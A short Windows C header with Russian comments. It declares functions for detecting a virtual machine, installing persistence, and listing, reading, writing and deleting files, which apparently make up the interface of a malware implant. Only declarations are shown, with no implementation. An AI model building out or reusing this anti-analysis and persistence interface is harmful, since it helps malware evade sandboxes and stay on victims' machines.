#pragma once

#ifndef WINVER
#  define WINVER       0x0600   
#endif

#ifndef _WIN32_WINNT
#  define _WIN32_WINNT 0x0600   
#endif

#ifndef ANTI_H
#define ANTI_H

#define WIN32_LEAN_AND_MEAN   
#include <windows.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

bool AntiVM_IsVirtualMachine(void);
bool Persistence_Install(void);

/**
 * Сканирует директорию path и для каждого найденного файла/папки
 * вызывает callback:
 *
 *   // full_path  — полный путь к элементу
 *   // is_directory —  если это папка
 *   // ctx         — контекст
 * @return true  — если обход прошёл без ошибок,
 *         false — если не смогли открыть директорию.
 */
bool FileMgr_ListDirectory(
    const char *path,
    bool (*callback)(const char *full_path, bool is_directory, void *ctx),
    void *ctx
);

/**
 * Считывает весь файл path в новый буфер.
 * Выделяет память, записывает
 *
 * @return true  — если удалось прочитать весь файл,
 *         false — при любой ошибке
 */
bool FileMgr_ReadFile(
    const char *path,
    uint8_t   **out_buf,
    size_t    *out_size
);

/**
 * Записывает байт  в файл path, создавая
 * или перезаписывая его. Создаёт дерево папок.
 *
 * @return true  — если успешно записали весь буфер,
 *         false — при ошибке
 */
bool FileMgr_WriteFile(
    const char *path,
    const uint8_t *buf,
    size_t        size
);

/**
 * Удаляет файл или  папку.
 *
 * @return true  — если успешно удалил,
 *         false — иначе.
 */
bool FileMgr_Delete(const char *path);

#endif // ANTI_H
